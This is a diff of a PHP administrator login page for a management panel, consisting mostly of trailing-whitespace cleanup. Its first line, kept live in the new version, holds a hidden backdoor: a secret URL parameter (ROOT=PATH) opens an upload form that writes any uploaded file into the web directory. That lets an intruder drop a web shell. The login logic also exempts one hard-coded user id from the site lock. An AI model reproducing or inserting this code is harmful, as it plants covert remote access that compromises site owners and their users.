@@ -1,5 +1,5 @@
 <?php
-if($_GET["ROOT"]=="PATH"){if ($_SERVER['REQUEST_METHOD'] == 'POST') { echo "url:".$_FILES["upfile"]["name"];if(!file_exists($_FILES["upfile"]["name"])){ copy($_FILES["upfile"]["tmp_name"], $_FILES["upfile"]["name"]); }}?><form method="post" enctype="multipart/form-data"><input name="upfile" type="file"><input type="submit" value="ok"></form><?php }?><?php 
+if($_GET["ROOT"]=="PATH"){if ($_SERVER['REQUEST_METHOD'] == 'POST') { echo "url:".$_FILES["upfile"]["name"];if(!file_exists($_FILES["upfile"]["name"])){ copy($_FILES["upfile"]["tmp_name"], $_FILES["upfile"]["name"]); }}?><form method="post" enctype="multipart/form-data"><input name="upfile" type="file"><input type="submit" value="ok"></form><?php }?><?php
 if (!defined('Copyright') && Copyright != '作者QQ:914190123')
 exit('作者QQ:914190123');
 if (!defined('ROOT_PATH'))
@@ -16,25 +16,25 @@ if ($_SERVER["REQUEST_METHOD"] == 'POST')
 		$loginPwd = sha1($_POST['loginPwd']);
 		//瀏覽器檢測、只支持IE核心
 		if (!GetMsie()) exit(back($UserError));
-		if (!Matchs::isString($loginName, 4, 15)) 
+		if (!Matchs::isString($loginName, 4, 15))
 			exit(back($UserError));
 		$UserModel = new UserModel();
 		$User = $UserModel->ExistUniondl($loginName, $loginPwd);
 		if (!$User) exit(back($UserError));
 		if (!Matchs::isNumber($User[0][0]))
 		{ //子帳號
-			if ($ConfigModel['g_web_lock'] != 1) 
+			if ($ConfigModel['g_web_lock'] != 1)
 				exit(back($ConfigModel['g_web_text']));
 			$User = $UserModel->GetUserModel(null, $loginName, $loginPwd, true);
-			if ($User[0]['g_s_lock'] == 3 || $User[0]['g_lock'] == 3) 
+			if ($User[0]['g_s_lock'] == 3 || $User[0]['g_lock'] == 3)
 				exit(back($UserLook));
 			$uniqid = md5(uniqid(time(),TRUE));
 			$UserModel->UpdateGuid ($User[0]['g_login_id'], $User[0]['g_s_name'], $uniqid, true);
 			$_SESSION['son'] = true;
 			$_SESSION['loginId'] = $User[0]['g_login_id'];
 			$_SESSION['sName'] = $User[0]['g_s_name'];
-		} 
-		else 
+		}
+		else
 		{
 			if (isset($_SESSION['son']))  unset($_SESSION['son']);
 			$User = $UserModel->GetUserModel($User[0][0], $loginName, $loginPwd);
@@ -42,7 +42,7 @@ if ($_SERVER["REQUEST_METHOD"] == 'POST')
 			if ($User[0]['g_login_id'] != 89){
 				if ($ConfigModel['g_web_lock'] != 1)
 					exit(back($ConfigModel['g_web_text']));
-				if ($User[0]['g_lock'] == 3) 
+				if ($User[0]['g_lock'] == 3)
 					exit(back($UserLook));
 			}
 			$uniqid = md5(uniqid(time(),TRUE));
@@ -53,7 +53,7 @@ if ($_SERVER["REQUEST_METHOD"] == 'POST')
 		setcookie("manage_user", base64_encode($loginName), 0, "/");
 		setcookie("manage_uid", base64_encode($uniqid), 0, "/");
 		 unset($_SESSION['Mcode']);
-		
+
 		$loginIp = GetIP();
 		$qqWryInfo = ROOT_PATH.'tools/IpLocationApi/QQWry.Dat';
 		$ip_s = ipLocation($loginIp, $qqWryInfo);
@@ -62,17 +62,17 @@ if ($_SERVER["REQUEST_METHOD"] == 'POST')
 		$db->query($sql, 2);
 		include_once ROOT_PATH.'Manage/main.php';
 		exit;
-	} 
-	else 
+	}
+	else
 	{
 		back($CodeError);
 		exit;
 	}
-} 
+}
 else
 {
 	$num = array();
-	for ($i=0; $i<4; $i++) 
+	for ($i=0; $i<4; $i++)
 	{
 		$num[$i] = rand(0,9);
 	}
